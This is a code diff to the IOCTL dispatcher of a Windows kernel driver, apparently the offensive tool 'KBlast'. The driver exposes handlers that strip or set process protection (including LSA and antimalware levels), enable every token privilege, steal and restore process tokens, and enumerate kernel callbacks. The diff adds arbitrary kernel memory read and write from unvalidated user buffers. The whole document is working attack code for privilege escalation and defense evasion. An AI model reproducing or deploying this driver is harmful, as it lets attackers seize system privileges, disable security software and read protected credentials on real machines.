@@ -11,11 +11,13 @@ NTSTATUS KBlast_IOCTLDispatchar(PDEVICE_OBJECT pDeviceObject, PIRP pIRP)
 	UNREFERENCED_PARAMETER(pDeviceObject);
 	NTSTATUS status = 0;
 	PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(pIRP);
-	PKBLAST_BUFFER pUserlandParams = 0;
+	PKBLAST_BUFFER pUserlandGenericParams = 0;
+	PKBLAST_MEMORY_BUFFER pUserlandMemoryParams = 0;
 	ULONG length = 0;
 	ULONG outLength = stack->Parameters.DeviceIoControl.OutputBufferLength;
 
-	pUserlandParams = (PKBLAST_BUFFER)stack->Parameters.DeviceIoControl.Type3InputBuffer;
+	pUserlandGenericParams = (PKBLAST_BUFFER)stack->Parameters.DeviceIoControl.Type3InputBuffer;
+	pUserlandMemoryParams = (PKBLAST_MEMORY_BUFFER)stack->Parameters.DeviceIoControl.Type3InputBuffer;
 	switch (stack->Parameters.DeviceIoControl.IoControlCode)
 	{
 	case KBLAST_IOCTL_BUG_CHECK:
@@ -23,35 +25,35 @@ NTSTATUS KBlast_IOCTLDispatchar(PDEVICE_OBJECT pDeviceObject, PIRP pIRP)
 		break;
 
 	case KBLAST_IOCTL_PROTECT_WINTCB:
-		status = KBlast_ProcessProtection(pUserlandParams->integer1, PROTECTION_WINTCB);
+		status = KBlast_ProcessProtection(pUserlandGenericParams->integer1, PROTECTION_WINTCB);
 		break;
 
 	case KBLAST_IOCTL_PROTECT_LSA:
-		status = KBlast_ProcessProtection(pUserlandParams->integer1, PROTECTION_LSA);
+		status = KBlast_ProcessProtection(pUserlandGenericParams->integer1, PROTECTION_LSA);
 		break;
 
 	case KBLAST_IOCTL_PROTECT_ANTIMALWARE:
-		status = KBlast_ProcessProtection(pUserlandParams->integer1, PROTECTION_ANTIMALWARE);
+		status = KBlast_ProcessProtection(pUserlandGenericParams->integer1, PROTECTION_ANTIMALWARE);
 		break;
 
 	case KBLAST_IOCTL_PROTECT_NONE:
-		status = KBlast_ProcessProtection(pUserlandParams->integer1, PROTECTION_NONE);
+		status = KBlast_ProcessProtection(pUserlandGenericParams->integer1, PROTECTION_NONE);
 		break;
 
 	case KBLAST_IOCTL_TOKEN_PRIVILEGES_ENABLEALL:
-		status = KBlast_TokenPrivilegeManipulate(pUserlandParams->integer1, PRIVILEGES_ENABLEALL);
+		status = KBlast_TokenPrivilegeManipulate(pUserlandGenericParams->integer1, PRIVILEGES_ENABLEALL);
 		break;
 
 	case KBLAST_IOCTL_TOKEN_PRIVILEGES_DISABLEALL:
-		status = KBlast_TokenPrivilegeManipulate(pUserlandParams->integer1, PRIVILEGES_DISABLEALL);
+		status = KBlast_TokenPrivilegeManipulate(pUserlandGenericParams->integer1, PRIVILEGES_DISABLEALL);
 		break;
 
 	case KBLAST_IOCTL_TOKEN_STEAL:
-		status = KBlast_TokenContextSteal(pUserlandParams->integer1, pUserlandParams->integer2);
+		status = KBlast_TokenContextSteal(pUserlandGenericParams->integer1, pUserlandGenericParams->integer2);
 		break;
 
 	case KBLAST_IOCTL_TOKEN_RESTORE:
-		status = KBlast_TokenContextRestore(pUserlandParams->integer1);
+		status = KBlast_TokenContextRestore(pUserlandGenericParams->integer1);
 		break;
 
 	case KBLAST_IOCTL_CALLBACK_PROCESS_LIST:
@@ -66,11 +68,19 @@ NTSTATUS KBlast_IOCTLDispatchar(PDEVICE_OBJECT pDeviceObject, PIRP pIRP)
 		status = KBlast_EnumProcessCallbacks(outLength, CALLBACK_IMAGE, pIRP->UserBuffer);
 		break;
 
+	case KBLAST_IOCTL_MEMORY_WRITE:
+		status = KBlaser_k_memory_manage(pUserlandMemoryParams, NULL, MEMORY_WRITE);
+		break;
+
+	case KBLAST_IOCTL_MEMORY_READ:
+		status = KBlaser_k_memory_manage(pUserlandMemoryParams, pIRP->UserBuffer, MEMORY_READ);
+		break;
+
 		// test IOCTL
 	case KBLAST_IOCTL_TEST:
 		DbgPrint("[i] WARNING: THIS IS A TEST IOCTL\n");
-		pUserlandParams = (PKBLAST_BUFFER)stack->Parameters.DeviceIoControl.Type3InputBuffer;
-		DbgPrint("[i] Userland parameter: %d\n", pUserlandParams->integer1);
+		//pUserlandGenericParams = (PKBLAST_BUFFER)stack->Parameters.DeviceIoControl.Type3InputBuffer;
+		//DbgPrint("[i] Userland parameter: %d\n", pUserlandGenericParams->integer1);
 
 		break;
 
